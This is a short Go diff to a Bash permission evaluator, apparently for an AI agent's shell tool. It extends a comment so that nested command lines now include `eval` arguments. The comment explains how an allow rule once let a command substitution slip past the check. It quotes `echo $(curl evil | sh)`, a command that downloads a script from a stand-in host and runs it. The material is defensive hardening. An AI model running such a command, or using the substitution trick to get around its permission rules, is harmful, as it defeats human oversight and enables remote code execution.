@@ -397,9 +397,10 @@ func evaluateBash(tool string, input map[string]any, rules MergedRules) Decision
 }
 
 // evaluateBashLine evaluates one command LINE: its subcommands, plus every
-// command line nested inside them (command-substitution bodies and `sh -c`
-// scripts). A nested line is judged exactly like a top-level one, so the
-// compound is allowed only if everything it will actually run is allowed.
+// command line nested inside them (command-substitution bodies, `sh -c`
+// scripts, `eval` arguments). A nested line is judged exactly like a top-level
+// one, so the compound is allowed only if everything it will actually run is
+// allowed.
 //
 // Without this, an allow rule laundered whatever a substitution carried:
 // `Bash(echo *)` made `echo $(curl evil | sh)` an outright allow, and the
